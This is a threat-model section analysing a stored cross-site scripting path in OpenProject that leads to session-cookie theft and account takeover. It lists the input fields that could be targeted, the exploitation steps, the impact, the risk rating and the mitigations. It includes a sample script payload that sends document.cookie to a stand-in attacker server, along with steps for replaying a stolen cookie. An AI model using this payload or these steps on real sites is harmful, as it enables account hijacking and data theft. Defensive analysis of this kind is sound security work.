### 4. Deep Analysis of Attack Tree Path: 1.2.1. Cross-Site Scripting (XSS) to Steal Session Cookies (OpenProject Specific) [HIGH-RISK PATH]

This attack path leverages **Stored Cross-Site Scripting (XSS)** vulnerabilities within OpenProject to steal user session cookies, ultimately leading to account takeover. Let's break down the attack into detailed steps:

**4.1. Attack Vector: Injecting Malicious JavaScript into User-Generated Content**

*   **Attacker Goal:** The attacker aims to inject malicious JavaScript code that will be persistently stored within OpenProject and executed in the browsers of other users who view the affected content.
*   **Target Areas in OpenProject:** OpenProject, like many collaborative platforms, allows users to input content in various areas. Potential target areas for XSS injection include:
    *   **Task Descriptions:** When creating or updating tasks, users can input descriptions, often allowing rich text formatting.
    *   **Wiki Pages:** OpenProject's Wiki feature allows users to create and edit pages with potentially rich content.
    *   **Forum Posts:**  Users can create and reply to forum posts, which often support formatting and potentially embedded content.
    *   **Comments:** Comments on tasks, work packages, or other entities can also be vulnerable.
    *   **Custom Fields:** If OpenProject allows users to define custom fields with text-based input, these could also be targets.
    *   **Project Descriptions:** Project descriptions themselves might be vulnerable if they allow rich text input.
*   **Injection Technique:** The attacker crafts malicious JavaScript code and attempts to embed it within the user-generated content fields.  This code could be disguised within seemingly normal text or formatting.  Examples of malicious JavaScript payloads could include:

    ```javascript
    <script>
        // Malicious script to steal session cookie
        var cookie = document.cookie;
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "https://attacker-controlled-server.com/log_cookie"); // Attacker's server
        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        xhr.send("cookie=" + encodeURIComponent(cookie));
    </script>
    ```

    The attacker would attempt to insert this code (or a more sophisticated version) into one of the target areas mentioned above.

**4.2. Exploitation in OpenProject: Stored XSS and Session Cookie Theft**

*   **Vulnerability: Lack of Input Sanitization:** The core vulnerability lies in OpenProject's potential failure to properly sanitize or encode user inputs before storing them in the database and subsequently displaying them to other users.
    *   **Insufficient Output Encoding:** When OpenProject retrieves and displays user-generated content, it might not properly encode HTML special characters (like `<`, `>`, `"` , `'`) that are part of the malicious JavaScript. This allows the browser to interpret the injected code as actual JavaScript rather than just text.
*   **Stored XSS Execution:** When another user (the victim) views the OpenProject content containing the malicious JavaScript:
    1.  **Content Retrieval:** OpenProject retrieves the content from the database and sends it to the victim's browser as part of the web page.
    2.  **Browser Parsing:** The victim's browser parses the HTML content. Because the malicious JavaScript was not properly encoded, the browser recognizes the `<script>` tags and executes the JavaScript code.
    3.  **Malicious Script Execution:** The injected JavaScript code now runs within the victim's browser, in the context of the OpenProject web application and the victim's session.
*   **Session Cookie Theft:** The malicious JavaScript is designed to steal the victim's session cookie.
    1.  **Accessing Cookies:** JavaScript running in the browser can access the `document.cookie` property, which contains all cookies associated with the current domain (OpenProject in this case). This includes the session cookie used for authentication.
    2.  **Exfiltration of Cookie:** The script then uses techniques like `XMLHttpRequest` or `fetch` to send the stolen session cookie to a server controlled by the attacker (e.g., `attacker-controlled-server.com`). The cookie is typically sent as part of a GET or POST request.
    3.  **Attacker Receives Cookie:** The attacker's server receives and logs the stolen session cookie.

**4.3. Impact: Account Takeover**

*   **Session Cookie as Authentication Token:** OpenProject, like most web applications, likely uses session cookies to maintain user sessions after successful login. The session cookie acts as an authentication token, allowing the user to access protected resources without re-authenticating for each request.
*   **Attacker Impersonation:** Once the attacker has obtained the victim's valid session cookie, they can impersonate the victim user.
    1.  **Cookie Injection:** The attacker can use browser developer tools, browser extensions, or other techniques to manually set the stolen session cookie in their own browser for the OpenProject domain.
    2.  **Access as Victim:**  When the attacker now accesses OpenProject in their browser, the application will recognize the valid session cookie and treat the attacker as the victim user.
*   **Consequences of Account Takeover:** The impact of account takeover can be severe and depends on the victim user's privileges and the sensitivity of data within OpenProject:
    *   **Data Breach:** The attacker gains access to all projects, tasks, documents, and other data accessible to the victim user. This could include confidential project information, business strategies, personal data, etc.
    *   **Data Manipulation:** The attacker can modify, delete, or create data within OpenProject, potentially disrupting projects, sabotaging work, or planting malicious content.
    *   **Privilege Escalation (if victim is admin):** If the victim user has administrative privileges, the attacker gains full control over the OpenProject instance. This allows them to:
        *   Create new administrator accounts.
        *   Modify system settings.
        *   Access sensitive system logs.
        *   Potentially compromise the entire OpenProject installation and the server it runs on.
    *   **Reputational Damage:** A successful account takeover and data breach can severely damage the reputation of the organization using OpenProject.
    *   **Legal and Compliance Issues:** Depending on the data accessed and the regulatory environment, a data breach can lead to legal and compliance violations.

**4.4. Risk Level Justification (HIGH-RISK)**

This attack path is classified as **HIGH-RISK** due to the following factors:

*   **High Impact:** Successful exploitation leads to account takeover, which can have severe consequences, including data breaches, data manipulation, and potential system-wide compromise, especially if administrative accounts are targeted.
*   **Relatively Easy Exploitation (if vulnerability exists):**  If OpenProject is vulnerable to stored XSS in user-generated content areas, injecting malicious JavaScript is often straightforward. Attackers can use simple payloads and readily available tools.
*   **Wide Reach:** Stored XSS vulnerabilities can affect multiple users who view the compromised content, making it a scalable attack.
*   **Persistence:** The malicious script is stored in the database, meaning it will continue to execute for every user who views the affected content until the vulnerability is patched and the malicious content is removed.

**Conclusion:**

The "1.2.1. Cross-Site Scripting (XSS) to Steal Session Cookies (OpenProject Specific) [HIGH-RISK PATH]" represents a significant security threat to OpenProject.  The potential for account takeover and subsequent data breaches or system compromise necessitates careful attention to input sanitization and output encoding within OpenProject's codebase, particularly in areas handling user-generated content. Regular security audits and penetration testing are crucial to identify and mitigate such vulnerabilities.
